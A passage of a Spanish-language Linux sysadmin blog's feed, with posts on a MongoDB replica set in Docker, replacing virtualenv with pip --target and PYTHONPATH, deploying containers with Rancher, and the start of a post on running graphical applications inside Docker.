            &lt;span class="s2"&gt;&amp;quot;name&amp;quot;&lt;/span&gt; : &lt;span class="s2"&gt;&amp;quot;rs03:27017&amp;quot;&lt;/span&gt;,
...  
            &lt;span class="s2"&gt;&amp;quot;stateStr&amp;quot;&lt;/span&gt; : &lt;span class="s2"&gt;&amp;quot;SECONDARY&amp;quot;&lt;/span&gt;,
...  
        &lt;span class="o"&gt;}&lt;/span&gt;
    &lt;span class="o"&gt;]&lt;/span&gt;,
    &lt;span class="s2"&gt;&amp;quot;ok&amp;quot;&lt;/span&gt; : &lt;span class="m"&gt;1&lt;/span&gt;
&lt;span class="o"&gt;}&lt;/span&gt;
rs:SECONDARY&amp;gt; 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y todo ha quedado como esperábamos, sin ninguna intervención manual por nuestra parte.&lt;/p&gt;</content><category term="mongodb"></category><category term="replica set"></category><category term="docker"></category><category term="docker-compose"></category></entry><entry><title>Evitando usar virtualenv mediante el uso de PYTHONPATH</title><link href="http://www.linuxsysadmin.ml/2018/01/evitando-usar-virtualenv-mediante-el-uso-de-pythonpath.html" rel="alternate"></link><published>2018-01-22T10:00:00+01:00</published><updated>2018-01-22T10:00:00+01:00</updated><author><name>Gerard</name></author><id>tag:www.linuxsysadmin.ml,2018-01-22:/2018/01/evitando-usar-virtualenv-mediante-el-uso-de-pythonpath.html</id><summary type="html">&lt;p&gt;Soy un gran fan de &lt;strong&gt;python&lt;/strong&gt; y siempre ando trasteando con alguna librería nueva, en vistas a un &lt;em&gt;script&lt;/em&gt; para simplificar mi trabajo, o simplemente como un &lt;em&gt;wekeend project&lt;/em&gt;. Me es infinitamente útil usar &lt;strong&gt;virtualenv&lt;/strong&gt;, pero genera una carpeta que ocupa demasiado y contiene algo más que solamente las librerías …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Soy un gran fan de &lt;strong&gt;python&lt;/strong&gt; y siempre ando trasteando con alguna librería nueva, en vistas a un &lt;em&gt;script&lt;/em&gt; para simplificar mi trabajo, o simplemente como un &lt;em&gt;wekeend project&lt;/em&gt;. Me es infinitamente útil usar &lt;strong&gt;virtualenv&lt;/strong&gt;, pero genera una carpeta que ocupa demasiado y contiene algo más que solamente las librerías.&lt;/p&gt;
&lt;p&gt;De hecho, solo tenemos que comprobar lo que ocupa un &lt;em&gt;virtualenv&lt;/em&gt; vacío:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@aldebaran:~/test$ virtualenv env
New python executable in /home/gerard/test/env/bin/python
Installing setuptools, pip, wheel...done.
gerard@aldebaran:~/test$ du -sh env/
16M env/
gerard@aldebaran:~/test$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Por el propio funcionamiento de &lt;strong&gt;python&lt;/strong&gt;, las carpetas de librerías son relativas al binario del mismo lenguaje, así que no es de extrañar que &lt;em&gt;virtualenv&lt;/em&gt; ponga un binario en cada entorno; activar este entorno se limita a poner la carpeta &lt;em&gt;bin/&lt;/em&gt; del &lt;em&gt;virtualenv&lt;/em&gt; en el &lt;em&gt;PATH&lt;/em&gt;. A esto le añadimos las herramientas &lt;em&gt;pip&lt;/em&gt; y &lt;em&gt;easy_install&lt;/em&gt;, y tenemos un montón de espacio desperdiciado.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@aldebaran:~/test$ find env/ -type f &lt;span class="p"&gt;|&lt;/span&gt; xargs ls -lrSh &lt;span class="m"&gt;2&lt;/span&gt;&amp;gt;/dev/null &lt;span class="p"&gt;|&lt;/span&gt; tail
-rw-r--r-- &lt;span class="m"&gt;1&lt;/span&gt; gerard gerard 114K mar &lt;span class="m"&gt;22&lt;/span&gt; &lt;span class="m"&gt;15&lt;/span&gt;:13 env/lib/python2.7/site-packages/pkg_resources/__init__.pyc
-rw-r--r-- &lt;span class="m"&gt;1&lt;/span&gt; gerard gerard 114K mar &lt;span class="m"&gt;22&lt;/span&gt; &lt;span class="m"&gt;15&lt;/span&gt;:13 env/lib/python2.7/site-packages/pip/_vendor/pkg_resources/__init__.pyc
-rw-r--r-- &lt;span class="m"&gt;1&lt;/span&gt; gerard gerard 115K mar &lt;span class="m"&gt;22&lt;/span&gt; &lt;span class="m"&gt;15&lt;/span&gt;:13 env/lib/python2.7/site-packages/pip/_vendor/html5lib/html5parser.py
-rw-r--r-- &lt;span class="m"&gt;1&lt;/span&gt; gerard gerard 119K mar &lt;span class="m"&gt;22&lt;/span&gt; &lt;span class="m"&gt;15&lt;/span&gt;:13 env/lib/python2.7/site-packages/pip/_vendor/html5lib/html5parser.pyc
-rw-r--r-- &lt;span class="m"&gt;1&lt;/span&gt; gerard gerard 219K mar &lt;span class="m"&gt;22&lt;/span&gt; &lt;span class="m"&gt;15&lt;/span&gt;:13 env/lib/python2.7/site-packages/pip/_vendor/pyparsing.py
-rw-r--r-- &lt;span class="m"&gt;1&lt;/span&gt; gerard gerard 221K mar &lt;span class="m"&gt;22&lt;/span&gt; &lt;span class="m"&gt;15&lt;/span&gt;:13 env/lib/python2.7/site-packages/pyparsing.pyc
-rw-r--r-- &lt;span class="m"&gt;1&lt;/span&gt; gerard gerard 222K mar &lt;span class="m"&gt;22&lt;/span&gt; &lt;span class="m"&gt;15&lt;/span&gt;:13 env/lib/python2.7/site-packages/pip/_vendor/pyparsing.pyc
-rw-r--r-- &lt;span class="m"&gt;1&lt;/span&gt; gerard gerard 226K mar &lt;span class="m"&gt;22&lt;/span&gt; &lt;span class="m"&gt;15&lt;/span&gt;:13 env/lib/python2.7/site-packages/pyparsing.py
-rw-r--r-- &lt;span class="m"&gt;1&lt;/span&gt; gerard gerard 337K mar &lt;span class="m"&gt;22&lt;/span&gt; &lt;span class="m"&gt;15&lt;/span&gt;:13 env/lib/python2.7/site-packages/pip/_vendor/requests/cacert.pem
-rwxr-xr-x &lt;span class="m"&gt;1&lt;/span&gt; gerard gerard &lt;span class="m"&gt;3&lt;/span&gt;,7M mar &lt;span class="m"&gt;22&lt;/span&gt; &lt;span class="m"&gt;15&lt;/span&gt;:13 env/bin/python
gerard@aldebaran:~/test$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Las carpetas desde las que se cargan los módulos y librerías de &lt;strong&gt;python&lt;/strong&gt; no son inmutables; se pueden añadir en &lt;em&gt;runtime&lt;/em&gt; a la lista &lt;em&gt;sys.path&lt;/em&gt; o se puede indicar en las variables de entorno del sistema, como podemos ver en &lt;a href="https://docs.python.org/2/using/cmdline.html#envvar-PYTHONPATH"&gt;la documentación&lt;/a&gt;. Solo necesitamos una manera de instalarlas en una carpeta propia, y esto es precisamente lo que nos permite el &lt;em&gt;flag --target&lt;/em&gt; de &lt;em&gt;pip&lt;/em&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@aldebaran:~/test$ pip install -t libs mongoengine
Collecting mongoengine
Collecting six &lt;span class="o"&gt;(&lt;/span&gt;from mongoengine&lt;span class="o"&gt;)&lt;/span&gt;
  Using cached six-1.10.0-py2.py3-none-any.whl
Collecting pymongo&amp;gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;2&lt;/span&gt;.7.1 &lt;span class="o"&gt;(&lt;/span&gt;from mongoengine&lt;span class="o"&gt;)&lt;/span&gt;
  Using cached pymongo-3.4.0-cp27-cp27mu-manylinux1_x86_64.whl
Installing collected packages: six, pymongo, mongoengine
Successfully installed mongoengine-0.11.0 pymongo-3.4.0 six-1.10.0
gerard@aldebaran:~/test$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y eso nos instala las librerías con sus dependencias en la carpeta &lt;em&gt;libs/&lt;/em&gt;, que va a crear si hace falta.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;NOTA&lt;/strong&gt;: Si el paquete instalaba binarios, no va a hacerlo, ya que no dispone de tal carpeta para dejarlo; este método no sería posible.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@aldebaran:~/test$ tree -d libs/
libs/
├── bson
├── gridfs
├── mongoengine
│   ├── base
│   └── queryset
├── mongoengine-0.11.0.dist-info
├── pymongo
├── pymongo-3.4.0.dist-info
└── six-1.10.0.dist-info

&lt;span class="m"&gt;9&lt;/span&gt; directories
gerard@aldebaran:~/test$ du -sh libs/
&lt;span class="m"&gt;3&lt;/span&gt;,2M    libs/
gerard@aldebaran:~/test$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;A pesar de la reducción de tamaño en disco, esto por sí solo no nos sirve de nada; si no le indicamos donde tiene que buscar &lt;strong&gt;mongoengine&lt;/strong&gt;, el intérprete va a fallar importándolo:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@aldebaran:~/test$ python
Python &lt;span class="m"&gt;2&lt;/span&gt;.7.9 &lt;span class="o"&gt;(&lt;/span&gt;default, Jun &lt;span class="m"&gt;29&lt;/span&gt; &lt;span class="m"&gt;2016&lt;/span&gt;, &lt;span class="m"&gt;13&lt;/span&gt;:08:31&lt;span class="o"&gt;)&lt;/span&gt; 
&lt;span class="o"&gt;[&lt;/span&gt;GCC &lt;span class="m"&gt;4&lt;/span&gt;.9.2&lt;span class="o"&gt;]&lt;/span&gt; on linux2
Type &lt;span class="s2"&gt;&amp;quot;help&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;copyright&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;credits&amp;quot;&lt;/span&gt; or &lt;span class="s2"&gt;&amp;quot;license&amp;quot;&lt;/span&gt; &lt;span class="k"&gt;for&lt;/span&gt; more information.
&amp;gt;&amp;gt;&amp;gt; import mongoengine
Traceback &lt;span class="o"&gt;(&lt;/span&gt;most recent call last&lt;span class="o"&gt;)&lt;/span&gt;:
  File &lt;span class="s2"&gt;&amp;quot;&amp;lt;stdin&amp;gt;&amp;quot;&lt;/span&gt;, line &lt;span class="m"&gt;1&lt;/span&gt;, in &amp;lt;module&amp;gt;
ImportError: No module named mongoengine
&amp;gt;&amp;gt;&amp;gt; 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Para usar esa carpeta de librerías, solo necesitamos que el intérprete de &lt;strong&gt;python&lt;/strong&gt; sepa donde están, sea por la variable de entorno o modificando la lista de carpetas &lt;em&gt;sys.path&lt;/em&gt; en &lt;em&gt;runtime&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;Veamos ambos casos, empezando con la opción en &lt;em&gt;runtime&lt;/em&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@aldebaran:~/test$ python
Python &lt;span class="m"&gt;2&lt;/span&gt;.7.9 &lt;span class="o"&gt;(&lt;/span&gt;default, Jun &lt;span class="m"&gt;29&lt;/span&gt; &lt;span class="m"&gt;2016&lt;/span&gt;, &lt;span class="m"&gt;13&lt;/span&gt;:08:31&lt;span class="o"&gt;)&lt;/span&gt; 
&lt;span class="o"&gt;[&lt;/span&gt;GCC &lt;span class="m"&gt;4&lt;/span&gt;.9.2&lt;span class="o"&gt;]&lt;/span&gt; on linux2
Type &lt;span class="s2"&gt;&amp;quot;help&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;copyright&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;credits&amp;quot;&lt;/span&gt; or &lt;span class="s2"&gt;&amp;quot;license&amp;quot;&lt;/span&gt; &lt;span class="k"&gt;for&lt;/span&gt; more information.
&amp;gt;&amp;gt;&amp;gt; import mongoengine
Traceback &lt;span class="o"&gt;(&lt;/span&gt;most recent call last&lt;span class="o"&gt;)&lt;/span&gt;:
  File &lt;span class="s2"&gt;&amp;quot;&amp;lt;stdin&amp;gt;&amp;quot;&lt;/span&gt;, line &lt;span class="m"&gt;1&lt;/span&gt;, in &amp;lt;module&amp;gt;
ImportError: No module named mongoengine
&amp;gt;&amp;gt;&amp;gt; import sys
&amp;gt;&amp;gt;&amp;gt; sys.path.append&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;libs&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;
&amp;gt;&amp;gt;&amp;gt; import mongoengine
&amp;gt;&amp;gt;&amp;gt; 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y solo queda hacerlo mediante el uso de la variable de entorno &lt;em&gt;PYTHONPATH&lt;/em&gt;, sea exportándola para su uso futuro, o modificándola solo para el proceso acompañante:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@aldebaran:~/test$ &lt;span class="nv"&gt;PYTHONPATH&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;libs python
Python &lt;span class="m"&gt;2&lt;/span&gt;.7.9 &lt;span class="o"&gt;(&lt;/span&gt;default, Jun &lt;span class="m"&gt;29&lt;/span&gt; &lt;span class="m"&gt;2016&lt;/span&gt;, &lt;span class="m"&gt;13&lt;/span&gt;:08:31&lt;span class="o"&gt;)&lt;/span&gt; 
&lt;span class="o"&gt;[&lt;/span&gt;GCC &lt;span class="m"&gt;4&lt;/span&gt;.9.2&lt;span class="o"&gt;]&lt;/span&gt; on linux2
Type &lt;span class="s2"&gt;&amp;quot;help&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;copyright&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;credits&amp;quot;&lt;/span&gt; or &lt;span class="s2"&gt;&amp;quot;license&amp;quot;&lt;/span&gt; &lt;span class="k"&gt;for&lt;/span&gt; more information.
&amp;gt;&amp;gt;&amp;gt; import mongoengine
&amp;gt;&amp;gt;&amp;gt; 
&amp;gt;&amp;gt;&amp;gt; exit&lt;span class="o"&gt;()&lt;/span&gt;
gerard@aldebaran:~/test$ &lt;span class="nb"&gt;export&lt;/span&gt; &lt;span class="nv"&gt;PYTHONPATH&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;libs
gerard@aldebaran:~/test$ python
Python &lt;span class="m"&gt;2&lt;/span&gt;.7.9 &lt;span class="o"&gt;(&lt;/span&gt;default, Jun &lt;span class="m"&gt;29&lt;/span&gt; &lt;span class="m"&gt;2016&lt;/span&gt;, &lt;span class="m"&gt;13&lt;/span&gt;:08:31&lt;span class="o"&gt;)&lt;/span&gt; 
&lt;span class="o"&gt;[&lt;/span&gt;GCC &lt;span class="m"&gt;4&lt;/span&gt;.9.2&lt;span class="o"&gt;]&lt;/span&gt; on linux2
Type &lt;span class="s2"&gt;&amp;quot;help&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;copyright&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;credits&amp;quot;&lt;/span&gt; or &lt;span class="s2"&gt;&amp;quot;license&amp;quot;&lt;/span&gt; &lt;span class="k"&gt;for&lt;/span&gt; more information.
&amp;gt;&amp;gt;&amp;gt; import mongoengine
&amp;gt;&amp;gt;&amp;gt; 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Ahora toca elegir cual de las dos formas os gusta más. Yo suelo utilizar la variable de entorno cuando ejecuto un &lt;em&gt;script&lt;/em&gt; de &lt;em&gt;bash&lt;/em&gt;, sino lo hago mediante &lt;em&gt;python&lt;/em&gt;.&lt;/p&gt;</content><category term="python"></category><category term="virtualenv"></category><category term="pip"></category></entry><entry><title>Una plataforma para desplegar contenedores: RancherOS</title><link href="http://www.linuxsysadmin.ml/2018/01/una-plataforma-para-desplegar-contenedores-rancheros.html" rel="alternate"></link><published>2018-01-15T10:00:00+01:00</published><updated>2018-01-15T10:00:00+01:00</updated><author><name>Gerard</name></author><id>tag:www.linuxsysadmin.ml,2018-01-15:/2018/01/una-plataforma-para-desplegar-contenedores-rancheros.html</id><summary type="html">&lt;p&gt;Aquellos que seguís este &lt;em&gt;blog&lt;/em&gt; de forma regular, habréis notado mi predilección por los contenedores &lt;strong&gt;docker&lt;/strong&gt;, en gran parte porque es con lo que trabajo en mi día a día. Hartos de usar la plataforma &lt;em&gt;custom&lt;/em&gt; que tenemos en la compañía buscamos una nueva, que simplifique el trabajo que hacemos …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Aquellos que seguís este &lt;em&gt;blog&lt;/em&gt; de forma regular, habréis notado mi predilección por los contenedores &lt;strong&gt;docker&lt;/strong&gt;, en gran parte porque es con lo que trabajo en mi día a día. Hartos de usar la plataforma &lt;em&gt;custom&lt;/em&gt; que tenemos en la compañía buscamos una nueva, que simplifique el trabajo que hacemos.&lt;/p&gt;
&lt;p&gt;Lo que tenemos actualmente es una amalgama de &lt;em&gt;hosts&lt;/em&gt; en donde desplegamos contenedores, en algunos servicios, y en otros los servicios que nos permiten hacer un &lt;em&gt;routing&lt;/em&gt; adecuado, por ejemplo, &lt;em&gt;proxies&lt;/em&gt; reversos, balanceadores y &lt;em&gt;firewalls&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;Sin embargo, estos contenedores se ven entre sí, así como a los &lt;em&gt;hosts&lt;/em&gt; que los levantan. A todo esto, el conjunto de servicios desplegados empezaba a impactar en la capacidad de mantenerla. En especial, la demanda de segregación de red de algún cliente nos hizo buscar alternativas de forma acelerada.&lt;/p&gt;
&lt;p&gt;Aunque no es nuestro futuro inmediato, salimos del paso con una solución completa que se llama &lt;a href="http://rancher.com/"&gt;Rancher&lt;/a&gt;. Su filosofía es muy simple: necesitamos un servidor de control que tenga una foto del &lt;em&gt;cluster&lt;/em&gt; (por supuesto un contenedor &lt;strong&gt;docker&lt;/strong&gt;, y un conjunto de servidores que añadan recursos al mismo (mediante otro servidor &lt;strong&gt;docker&lt;/strong&gt; que corre un agente). De hecho, en el &lt;em&gt;deploy&lt;/em&gt; más simple, basta con tener ambas cosas en la misma máquina.&lt;/p&gt;
&lt;p&gt;Para despliegues mas profesionales, disponen de un fichero &lt;em&gt;.iso&lt;/em&gt; para instalar un sistema operativo para ejecutar solamente &lt;strong&gt;Rancher&lt;/strong&gt;, que tiene lo básico para ejecutar &lt;strong&gt;Docker&lt;/strong&gt; y levanta sus servicios como contenedores.&lt;/p&gt;
&lt;h2&gt;Instalación de Rancher&lt;/h2&gt;
&lt;h3&gt;Servidor&lt;/h3&gt;
&lt;p&gt;Para levantar el servidor de &lt;strong&gt;Rancher&lt;/strong&gt; vamos a seguir los pasos de &lt;a href="http://docs.rancher.com/rancher/latest/en/installing-rancher/installing-server/"&gt;la instalación&lt;/a&gt;. Tan simple como levantar un contenedor.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@aldebaran:~$ docker run -d --restart&lt;span class="o"&gt;=&lt;/span&gt;unless-stopped -p &lt;span class="m"&gt;8080&lt;/span&gt;:8080 rancher/server
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Este contenedor nos ofrece la base de datos de control y una bonita interfaz de usuario en el puerto 8080 para administrar nuestro &lt;em&gt;cluster&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;Solo nos queda ver la interfaz de administración para comprobar que funciona, en &lt;a href="http://localhost:8080/"&gt;http://localhost:8080/&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img alt="Rancher panel" src="http://www.linuxsysadmin.ml/images/rancher-panel.png"&gt;&lt;/p&gt;
&lt;h3&gt;Hosts&lt;/h3&gt;
&lt;p&gt;En la interfaz de administración vemos una pestaña "Infraestructure" en donde podemos seleccionar "Hosts". Si le damos al botón "Add Host", veremos que añadir un &lt;em&gt;host&lt;/em&gt; es trivial; a la larga todo se reduce en levantar otro contenedor &lt;em&gt;rancher/agent&lt;/em&gt; en ese &lt;em&gt;host&lt;/em&gt;, para que nuestro servidor lo reconozca y le pueda enviar órdenes.&lt;/p&gt;
&lt;h2&gt;Conceptos básicos de Rancher&lt;/h2&gt;
&lt;p&gt;Si jugamos un rato con la interfaz, vamos a ver varios conceptos, que aquí se resumen:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Entornos&lt;/strong&gt;: Agrupaciones lógicas de recursos (&lt;em&gt;hosts&lt;/em&gt;). Cada entorno tiene sus propios &lt;em&gt;hosts&lt;/em&gt;. Solo hay conectividad de contenedores cuando están en el mismo entorno, dentro de &lt;strong&gt;Rancher&lt;/strong&gt;.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Stacks&lt;/strong&gt;: Agrupaciones lógicas de servicios, se despliegan en un entorno concreto.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Servicios&lt;/strong&gt;: Un servicio es la unidad mínima escalable, y se compone de un &lt;em&gt;primary service&lt;/em&gt; (un contenedor) y de cualquier número de &lt;em&gt;sidekick containers&lt;/em&gt;. Esta es la unidad mínima escalable. Se garantiza que todos los contenedores de este servicio se van a desplegar en un solo &lt;em&gt;host&lt;/em&gt;, y en caso de escalarlo, este &lt;em&gt;pack&lt;/em&gt; se repite en otros &lt;em&gt;hosts&lt;/em&gt; de acuerdo con las leyes de afinidad. Solo se pueden usar volúmenes de un contenedor en el mismo servicio.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Balanceadores&lt;/strong&gt;: Básicamente se trata de contenedores &lt;em&gt;haproxy&lt;/em&gt; que nos permiten poner un balanceador sin tener que crear nosotros un servicio especializado.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Catálogo&lt;/strong&gt;: Es un conjunto de plantillas de servicios prefabricados que podemos usar para crear nuestras propias &lt;em&gt;stacks&lt;/em&gt;. Podemos añadir nuestra &lt;em&gt;stack&lt;/em&gt; para el fácil despliegue de &lt;em&gt;stacks&lt;/em&gt; genéricas, por ejemplo bases de datos o herramientas de monitorización.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;La parte importante es que podemos declarar nuestros contenedores dentro de los servicios de la misma forma que lo hacemos en &lt;strong&gt;docker&lt;/strong&gt;, pero con un bonito formulario web.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;TRUCO&lt;/strong&gt;: Los servicios se pueden actualizar usando nuevas versiones de nuestros contenedores. &lt;strong&gt;Rancher&lt;/strong&gt; va a crear un nuevo conjunto de servicios sin eliminar los antiguos. A &lt;em&gt;posteriori&lt;/em&gt; podemos hacer un "Finish upgrade", que eliminaría los viejos contenedores asumiendo que nos gusta el resultado, o podemos hacer un "Rollback", que eliminaría los contenedores nuevos para dejar los viejos, en caso de que la nueva versión no nos satisfaga.&lt;/p&gt;
&lt;h2&gt;Un caso práctico&lt;/h2&gt;
&lt;p&gt;Supongamos que tenemos una web con datos financieros, con acceso por parte de muchos visitantes y con un entrada de nuevos datos a la base de datos mediante carga de ficheros por SFTP.&lt;/p&gt;
&lt;p&gt;Vamos a suponer que trabajamos en un entorno de test, específico para este proyecto por aislamiento de red; eso nos simplifica las decisiones. En un futuro se podría crear otro entorno para producción o para otro proyecto, pero de momento nos vale. También es posible hacer entornos compartidos para varios proyectos.&lt;/p&gt;
&lt;p&gt;Algunas decisiones de diseño:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Nuestra aplicación es un solo contenedor, que vamos a escalar para soportar la carga.&lt;/li&gt;
&lt;li&gt;Vamos a balancear la carga entre todos los contenedores de aplicación.&lt;/li&gt;
&lt;li&gt;La base de datos va a ir separada en otro contenedor, que todas las instancias de la aplicación puedan ver.&lt;/li&gt;
&lt;li&gt;El sistema de inyección de datos se va a componer de 3 contenedores: uno para el SFTP, uno para el volumen de datos y otro para el procesador de dichos datos.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Y con este &lt;em&gt;setup&lt;/em&gt;, podemos empezar a construir nuestro entorno. no importa cuantos &lt;em&gt;stacks&lt;/em&gt; hagamos, pero seguramente, la base de datos tendrá su propio &lt;em&gt;stack&lt;/em&gt; porque lo pondremos directamente del catálogo. Podemos poner todo el resto en un solo &lt;em&gt;stack&lt;/em&gt; o separarlos por subsistemas (web balanceada, bases de datos, inyector de datos).&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;La parte mas fácil es la base de datos. Creamos un servicio simple para que todos lo utilicen.&lt;/li&gt;
&lt;li&gt;Los contenedores de aplicación van a ser otro servicio. Que sean servicios individuales nos permite escalarlos individualmente del resto de componentes.&lt;/li&gt;
&lt;li&gt;Creamos un balanceador para el servicio de aplicación. En este punto ya deberíamos poder acceder al entorno, aunque sin la entrada de datos.&lt;/li&gt;
&lt;li&gt;Los contenedores del sistema de inyección de datos deben formar parte de un único servicio, porque es la única forma de que puedan montar los volúmenes del contenedor de datos. Dejaremos este servicio escalado a 1, que nos va a poner un contenedor de cada en una sola de las máquinas. No es importante que contenedor es el primario, pero vamos a poner el SFTP por un sencillo motivo: solo los contenedores primarios pueden ser el objetivo del balanceador, que de momento no pondremos, pero tal vez algún día lo queramos.&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;Y con esto tendremos nuestro proyecto corriendo. Es el momento de guardar las &lt;em&gt;stacks&lt;/em&gt; en el catálogo, ya que eso va a simplificar el &lt;em&gt;deploy&lt;/em&gt; cuando creemos otro entorno.&lt;/p&gt;</content><category term="docker"></category><category term="cluster"></category><category term="rancher"></category></entry><entry><title>Aplicaciones gráficas en un contenedor</title><link href="http://www.linuxsysadmin.ml/2018/01/aplicaciones-graficas-en-un-contenedor.html" rel="alternate"></link><published>2018-01-08T10:00:00+01:00</published><updated>2018-01-08T10:00:00+01:00</updated><author><name>Gerard</name></author><id>tag:www.linuxsysadmin.ml,2018-01-08:/2018/01/aplicaciones-graficas-en-un-contenedor.html</id><summary type="html">&lt;p&gt;A veces nos encontramos en un ordenador que no tenemos preparado para usar nuestras aplicaciones habituales, o simplemente no es el nuestro, o no queremos ensuciarlo para probar aplicaciones nuevas. Si disponemos de &lt;strong&gt;docker&lt;/strong&gt;, es posible ejecutarlas compartiendo solamente el &lt;em&gt;unix socket&lt;/em&gt; del servidor gráfico para verlas en nuestra pantalla …&lt;/p&gt;</summary><content type="html">&lt;p&gt;A veces nos encontramos en un ordenador que no tenemos preparado para usar nuestras aplicaciones habituales, o simplemente no es el nuestro, o no queremos ensuciarlo para probar aplicaciones nuevas. Si disponemos de &lt;strong&gt;docker&lt;/strong&gt;, es posible ejecutarlas compartiendo solamente el &lt;em&gt;unix socket&lt;/em&gt; del servidor gráfico para verlas en nuestra pantalla.&lt;/p&gt;
&lt;p&gt;El fichero &lt;em&gt;Dockerfile&lt;/em&gt; no es distinto del que usaríamos para una aplicación sin entorno gráfico, bastando instalar el programa que queramos y confiando en que el sistema de dependencias del gestor de paquetes consiga lo que este necesite.&lt;/p&gt;
&lt;p&gt;En este caso pongo un editor de lenguaje de marcado &lt;em&gt;markdown&lt;/em&gt;, pero se podría poner un navegador, un juego o lo que queramos.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sirius:~/docker/retext$ cat Dockerfile 
FROM debian:jessie
RUN apt-get update &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="se"&gt;\&lt;/span&gt;
    apt-get install -y retext &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="se"&gt;\&lt;/span&gt;
    rm -rf /var/lib/apt/lists/*
RUN useradd gerard
USER gerard
CMD &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;/usr/bin/retext&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;
gerard@sirius:~/docker/retext$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Construimos la imagen de la misma forma en la que lo hacemos habitualmente, con el mismo comando &lt;em&gt;docker build&lt;/em&gt; habitual:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sirius:~/docker/retext$ docker build -t retext .
Sending build context to Docker daemon &lt;span class="m"&gt;2&lt;/span&gt;.048 kB
Step &lt;span class="m"&gt;1&lt;/span&gt; : FROM debian:jessie
 ---&amp;gt; 19134a8202e7
Step &lt;span class="m"&gt;2&lt;/span&gt; : RUN apt-get update &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt;     apt-get install -y retext &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt;     rm -rf /var/lib/apt/lists/*
 ---&amp;gt; Running in bb0cdc51af3e
...
 ---&amp;gt; 1150d6a6a3e2
Removing intermediate container bb0cdc51af3e
Step &lt;span class="m"&gt;3&lt;/span&gt; : RUN useradd gerard
 ---&amp;gt; Running in 97e1de7b50d3
 ---&amp;gt; 4d8f69d5f570
Removing intermediate container 97e1de7b50d3
Step &lt;span class="m"&gt;4&lt;/span&gt; : USER gerard
 ---&amp;gt; Running in 29bb618fc788
 ---&amp;gt; 1a7388f29cda
Removing intermediate container 29bb618fc788
Step &lt;span class="m"&gt;5&lt;/span&gt; : CMD /usr/bin/retext
 ---&amp;gt; Running in fefaa04ee25e
 ---&amp;gt; af856bcf0c49
Removing intermediate container fefaa04ee25e
Successfully built af856bcf0c49
gerard@sirius:~/docker/retext$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Si intentamos ejecutar esta imagen, veremos que falla; el contenedor no tiene acceso a los dispositivos, ni al &lt;em&gt;unix socket&lt;/em&gt; en donde este se ejecuta. Tampoco tenemos definida la variable de sistema &lt;em&gt;DISPLAY&lt;/em&gt;.&lt;/p&gt;
